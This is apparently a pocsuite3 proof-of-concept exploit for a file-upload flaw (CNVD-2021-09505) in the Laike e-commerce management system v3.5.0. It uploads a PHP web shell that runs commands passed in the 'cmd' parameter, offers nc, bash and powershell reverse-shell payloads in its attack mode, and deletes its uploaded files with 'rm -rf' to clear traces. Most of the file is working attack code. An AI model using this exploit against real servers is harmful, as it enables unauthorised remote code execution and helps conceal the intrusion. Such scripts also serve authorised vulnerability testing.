# !/usr/bin/env python
# -*- coding: UTF-8 -*-
import json
from collections import OrderedDict
from urllib.parse import urlparse, urljoin
import random
import string
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class CNVD_2021_09505(POCBase):
    vulID = 'CNVD-2021-09505'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2020-12-01'
    createDate = '2021-02-06'
    updateDate = '2021-02-06'
    references = ['']
    name = '来客电商管理系统存在文件上传漏洞'
    appPowerLink = 'http://www.laiketui.com/'
    appName = '来客电商管理系统'
    appVersion = """来客电商管理系统 v3.5.0"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''湖南壹拾捌号网络技术有限公司 来客电商管理系统 v3.5.0'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
            "powershell": REVERSE_PAYLOAD.POWERSHELL,
        }
        o["command"] = OptDict(selected="powershell", default=payload)
        return o

    def _check(self, url):

        Sname = ''.join(random.sample(string.ascii_letters + string.digits, 5))
        Secho = ''.join(random.sample(string.ascii_letters + string.digits, 50))
        Scmd = "<?php $command=$_GET['cmd'];echo shell_exec($command);"
        self.timeout = 3
        path = "/LKT/index.php?module=api&action=product&m=t_comment"
        vul_url = urljoin(url, path)
        v0=vul_url
        payload = "------WebKitFormBoundarymtWcHjwCbo2qE3Zi\r\nContent-Disposition: form-data; name=\"imgFile\";filename=\"{Sname}.php\"\r\nContent-Type:image/php\r\n\r\n{Secho}\r\n------WebKitFormBoundarymtWcHjwCbo2qE3Zi\r\nContent-Disposition: form-data; name=\"type\";\r\n\r\nfile\r\n------WebKitFormBoundarymtWcHjwCbo2qE3Zi--".format(
            Sname=Sname,Secho=Secho)
        parse = urlparse(vul_url)
        headers = {
            "Host": "{}".format(parse.netloc),
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymtWcHjwCbo2qE3Zi"
        }
        try:
            r = requests.post(vul_url, headers=headers, timeout=self.timeout, data=payload, verify=False,allow_redirects=False)
        except Exception:
            return False
        else:
            rjson = json.loads(r.text)
            re_values = "VALUES \('(.*?\.php)',"
            values = re.findall(re_values, str(rjson))
            VALUES = values[0]
            path = "/LKT/images/{VALUES}".format(VALUES=VALUES)
            vul_url = urljoin(url, path)
            target = url
            v1=vul_url
            try:
                r = requests.get(url=vul_url,timeout=self.timeout, data=payload, verify=False,allow_redirects=False)
            except Exception:
                return False
            else:
                if Secho in r.text:
                    results=r.text
                    payload = "------WebKitFormBoundarymtWcHjwCbo2qE3Zi\r\nContent-Disposition: form-data; name=\"imgFile\";filename=\"{Sname}.php\"\r\nContent-Type:image/php\r\n\r\n{Secho}\r\n------WebKitFormBoundarymtWcHjwCbo2qE3Zi\r\nContent-Disposition: form-data; name=\"type\";\r\n\r\nfile\r\n------WebKitFormBoundarymtWcHjwCbo2qE3Zi--".format(
                        Sname=Sname, Secho=Scmd)
                    path = "/LKT/index.php?module=api&action=product&m=t_comment"
                    vul_url = urljoin(url, path)
                    try:
                        rr = requests.post(vul_url, headers=headers, timeout=self.timeout, data=payload, verify=False,allow_redirects=False)
                    except Exception:
                        return False
                    else:
                        rjson = json.loads(rr.text)
                        re_values = "VALUES \('(.*?\.php)',"
                        values = re.findall(re_values, str(rjson))
                        VALUES2 = values[0]
                        path2 = "/LKT/images/{VALUES}".format(VALUES=VALUES)
                        vul_url = urljoin(url, path2)
                        v2=vul_url
                        clear = "rm -rf {php1} {php2}".format(php1=VALUES,php2=VALUES2)
                        path = "/LKT/images/{VALUES}?cmd={cmd}".format(VALUES=VALUES2, cmd=clear)
                        vul_url_r = urljoin(self.url, path)
                        try:
                            rr = requests.get(url=vul_url_r,timeout=self.timeout,verify=False,allow_redirects=False)
                            r1 = requests.get(url=v1,timeout=self.timeout,verify=False,allow_redirects=False)
                            r2 = requests.get(url=v2, timeout=self.timeout, verify=False,allow_redirects=False)
                            if r1.status_code == 404 and r2.status_code == 404 and "File not found" :
                                print("\033[1;31m\n!!!Traces have been automatically cleared!!!" '\033[0m\n')
                        except Exception:
                            return False
                        else:
                            return v0, headers,results,url,Scmd,target
            return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[3]
            result['VerifyInfo']['Verification code'] = p[2]
        return self.parse_output(result)

    def _attack(self):
        proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "https://127.0.0.1:8080"
        }
        result = {}
        p = self._check(self.url)
        Sname = ''.join(random.sample(string.ascii_letters + string.digits, 5))
        Scmd = p[4]
        if p:
            try:
                vul_url = p[0]
                headers = p[1]
                payload = "------WebKitFormBoundarymtWcHjwCbo2qE3Zi\r\nContent-Disposition: form-data; name=\"imgFile\";filename=\"{Sname}.php\"\r\nContent-Type:image/php\r\n\r\n{Secho}\r\n------WebKitFormBoundarymtWcHjwCbo2qE3Zi\r\nContent-Disposition: form-data; name=\"type\";\r\n\r\nfile\r\n------WebKitFormBoundarymtWcHjwCbo2qE3Zi--".format(
                    Sname=Sname, Secho=Scmd)
                r = requests.post(url = vul_url,headers=headers,data=payload)
            except Exception:
                return False
            else:
                rjson = json.loads(r.text)
                if 'VALUES' in r.text:
                    re_values = "VALUES \('(.*?\.php)',"
                    values = re.findall(re_values, str(rjson))
                    VALUES = values[0]
                    cmd = self.get_option("command")
                    print("\033[1;31m\npayload:" + cmd + '\033[0m\n')
                    path = "/LKT/images/{VALUES}?cmd={cmd}".format(VALUES=VALUES, cmd=cmd)
                    vul_url = urljoin(self.url, path)
                    v1=vul_url
                    try:
                        r = requests.get(vul_url, timeout=self.timeout, verify=False,allow_redirects=False)
                    except Exception:
                        return False
                    else:
                        if r.status_code == 200:
                            result['VerifyInfo'] = {}
                            result['VerifyInfo']['URL'] = p[5]
                            result['VerifyInfo']['result'] = "\n" + r.text
                            clear = "rm -rf {php}".format(php=VALUES)
                            path = "/LKT/images/{VALUES}?cmd={cmd}".format(VALUES=VALUES, cmd=clear)
                            vul_url = urljoin(self.url, path)
                            try:
                                r = requests.get(url=vul_url, timeout=self.timeout, verify=False,allow_redirects=False)
                                r1 = requests.get(url=v1, timeout=self.timeout, verify=False,allow_redirects=False)
                                if r1.status_code == 404 :
                                    print("\033[1;31m\n!!!Traces have been automatically cleared!!!" '\033[0m\n')
                            except Exception:
                                return False
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('url is not vulnerable')
        return output


register_poc(CNVD_2021_09505)
